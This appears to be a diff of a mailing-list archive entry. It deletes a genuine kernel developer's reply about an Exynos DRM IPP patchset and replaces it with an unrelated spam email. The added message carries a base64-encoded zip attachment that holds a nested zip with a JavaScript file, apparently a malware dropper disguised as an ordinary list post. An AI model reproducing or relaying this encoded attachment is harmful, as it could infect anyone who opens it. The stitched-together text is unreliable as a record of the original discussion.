@@ -1,154 +1,146 @@
-From: Tobias Jakobi <tjakobi@math.uni-bielefeld.de>
-Subject: Re: [PATCH v2 0/9] Exynos DRM: rewrite IPP subsystem and userspace
- API
-Date: Fri, 29 Sep 2017 15:24:09 +0200
-Message-ID: <609b4512-b8e1-c28a-126d-25b0ac2f533c@math.uni-bielefeld.de>
-References: <CGME20170929073300eucas1p29f75848701e8181d1482ce4e202c4b6e@eucas1p2.samsung.com>
- <1506670374-15689-1-git-send-email-m.szyprowski@samsung.com>
+From: <noord-holland@netwerkmassagebijkanker.nl>
+Subject: (unknown)
+Date: Fri, 29 Sep 2017 15:42:11 -0000
+Message-ID: <150669973108.12042.17014009507179506334@impsat.net.ar>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 7BIT
+Content-Type: application/zip; name="87244.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-samsung-soc-owner@vger.kernel.org>
-Received: from smtp.math.uni-bielefeld.de ([129.70.45.10]:37412 "EHLO
-        smtp.math.uni-bielefeld.de" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1751176AbdI2NYL (ORCPT
+Received: from 64-76-13-175.static.impsat.net.ar ([64.76.13.175]:47906 "HELO
+        impsat.net.ar" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751346AbdI2PmP (ORCPT
         <rfc822;linux-samsung-soc@vger.kernel.org>);
-        Fri, 29 Sep 2017 09:24:11 -0400
-In-Reply-To: <1506670374-15689-1-git-send-email-m.szyprowski@samsung.com>
+        Fri, 29 Sep 2017 11:42:15 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-samsung-soc-owner@vger.kernel.org
 List-Id: linux-samsung-soc@vger.kernel.org
-To: Marek Szyprowski <m.szyprowski@samsung.com>, dri-devel@lists.freedesktop.org, linux-samsung-soc@vger.kernel.org
-Cc: Inki Dae <inki.dae@samsung.com>, Seung-Woo Kim <sw0312.kim@samsung.com>, Andrzej Hajda <a.hajda@samsung.com>, Bartlomiej Zolnierkiewicz <b.zolnierkie@samsung.com>, Tobias Jakobi <tjakobi@math.uni-bielefeld.de>, Krzysztof Kozlowski <krzk@kernel.org>, Sylwester Nawrocki <s.nawrocki@samsung.com>, Andrzej Pietrasiewicz <andrzej.p@samsung.com>
+To: linux-samsung-soc@vger.kernel.org
 
-Hello Marek,
-
-I just tested this series, and I noticed a lot of these lines:
-> exynos-sysmmu 11a40000.sysmmu: restoring state
-> exynos-sysmmu 11a40000.sysmmu: saving state
-
-I guess it would make sense to enable autosuspend for runtime PM in each of the
-hw drivers.
-
-I've just send a patch that does it for the FIMC (the only hw I can test this
-on). This improves frame time stability for me.
-
-With best wishes,
-Tobias
-
-
-Marek Szyprowski wrote:
-> Dear all,
-> 
-> This patchset performs complete rewrite of Exynos DRM IPP subsystem and
-> its userspace API.
-> 
-> Why such rewrite is needed? Exynos DRM IPP API is over-engineered in
-> general, but not really extensible on the other side. It is also buggy,
-> with significant design flaws:
-> - Userspace API covers memory-2-memory picture operations together with
->   CRTC writeback and duplicating features, which belongs to video plane.
-> - Lack of support of the all required image formats (for example NV12
->   Samsung-tiled cannot be used due to lack of pixel format modifier
->   support).
-> - Userspace API designed only to mimic hardware behaviour, not easy to
->   understand.
-> - Lack of proper input validation in the core, drivers also didn't do that
->   correctly, so it was possible to set incorrect parameters and easil
->   trigger IOMMU fault or memory trash.
-> - Drivers were partially disfunctional or supported only a subset of modes.
-> 
-> Due to the above limitations and issues the Exynos DRM IPP API was not
-> used by any of the open-source projects. I assume that it is safe to remove
-> this broken API without any damage to open-source community. All remaining
-> users (mainly Tizen project related) will be updated to the new version.
-> 
-> This patchset changes Exynos DRM IPP subsystem to something useful. The
-> userspace API is much simpler, state-less and easy to understand. Also
-> the code of the core and driver is significantly smaller and easier to
-> understand.
-> 
-> Patches were tested on Exynos4412 based Odroid U3 and Exynos5422
-> Odroid XU3 boards, on top of Linux next-20170928 kernel.
-> 
-> Best regards
-> Marek Szyprowski
-> Samsung R&D Institute Poland
-> 
-> 
-> Changelog:
-> 
-> v2:
-> - fixed minor issues pointed by other developers:
->   * fixed possible null pointer dereferrence (Tobias)
->   * changed limits_size to limits_count (Tobias)
->   * renamed struct exynos_drm_ipp_format to drm_exynos_ipp_format (Andrzej)
->   * added proper return value from exynos_drm_ipp_get_res_ioctl when no IPP
->     driver is present (Andrzej)
->   * properly aligned all uapi structures to be 32/64 bit safe (Emil)
->   * properly initialize all strucutres
-> - added new Exynos Scaler driver from Andrzej Pietrasiewicz
-> 
-> v1: https://www.spinics.net/lists/linux-samsung-soc/msg60492.html
-> - initial version of IPP v2
-> 
-> My previous works in this area:
-> 
-> "[RFC v2 0/2] Exynos DRM: add Picture Processor extension"
-> https://www.spinics.net/lists/dri-devel/msg140669.html
-> - removed usage of DRM objects and properties - replaced them with simple
->   list of parameters with predefined IDs
-> 
-> "[RFC 0/4] Exynos DRM: add Picture Processor extension"
-> https://www.spinics.net/lists/linux-samsung-soc/msg59323.html
-> - moved this feature from DRM core to Exynos DRM driver
-> - changed name from framebuffer processor to picture processor
-> - simplified code to cover only things needed by Exynos drivers
-> - implemented simple fifo task scheduler
-> - cleaned up rotator driver conversion (removed IPP remainings)
-> 
-> "[RFC 0/2] New feature: Framebuffer processors"
-> https://www.spinics.net/lists/linux-samsung-soc/msg54810.html
-> - generic approach implemented in DRM core, rejected
-> 
-> 
-> Patch summary:
-> 
-> Andrzej Pietrasiewicz (3):
->   drm/exynos: Add driver for Exynos Scaler module
->   drivers: clk: samsung: Fix m2m scaler clock on Exynos542x
->   ARM: dts: exynos: Add mem-2-mem Scaler devices
-> 
-> Marek Szyprowski (6):
->   drm/exynos: ipp: Remove Exynos DRM IPP subsystem
->   drm/exynos: ipp: Add IPP v2 framework
->   drm/exynos: rotator: Convert driver to IPP v2 core API
->   drm/exynos: gsc: Convert driver to IPP v2 core API
->   drm/exynos: Add generic support for devices shared with V4L2 subsystem
->   drm/exynos: fimc: Convert driver to IPP v2 core API
-> 
->  .../devicetree/bindings/gpu/samsung-scaler.txt     |   25 +
->  arch/arm/boot/dts/exynos5420.dtsi                  |   35 +
->  drivers/clk/samsung/clk-exynos5420.c               |    2 +-
->  drivers/gpu/drm/exynos/Kconfig                     |   18 +-
->  drivers/gpu/drm/exynos/Makefile                    |    1 +
->  drivers/gpu/drm/exynos/exynos_drm_drv.c            |   36 +-
->  drivers/gpu/drm/exynos/exynos_drm_drv.h            |    5 +-
->  drivers/gpu/drm/exynos/exynos_drm_fimc.c           |  893 +++-----
->  drivers/gpu/drm/exynos/exynos_drm_fimc.h           |   23 -
->  drivers/gpu/drm/exynos/exynos_drm_gsc.c            |  853 ++------
->  drivers/gpu/drm/exynos/exynos_drm_gsc.h            |   24 -
->  drivers/gpu/drm/exynos/exynos_drm_ipp.c            | 2240 ++++++--------------
->  drivers/gpu/drm/exynos/exynos_drm_ipp.h            |  357 ++--
->  drivers/gpu/drm/exynos/exynos_drm_rotator.c        |  735 ++-----
->  drivers/gpu/drm/exynos/exynos_drm_rotator.h        |   19 -
->  drivers/gpu/drm/exynos/exynos_drm_scaler.c         |  675 ++++++
->  drivers/gpu/drm/exynos/regs-scaler.h               |  426 ++++
->  include/uapi/drm/exynos_drm.h                      |  326 +--
->  18 files changed, 2818 insertions(+), 3875 deletions(-)
->  create mode 100644 Documentation/devicetree/bindings/gpu/samsung-scaler.txt
->  delete mode 100644 drivers/gpu/drm/exynos/exynos_drm_fimc.h
->  delete mode 100644 drivers/gpu/drm/exynos/exynos_drm_gsc.h
->  delete mode 100644 drivers/gpu/drm/exynos/exynos_drm_rotator.h
->  create mode 100644 drivers/gpu/drm/exynos/exynos_drm_scaler.c
->  create mode 100644 drivers/gpu/drm/exynos/regs-scaler.h
-> 
+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
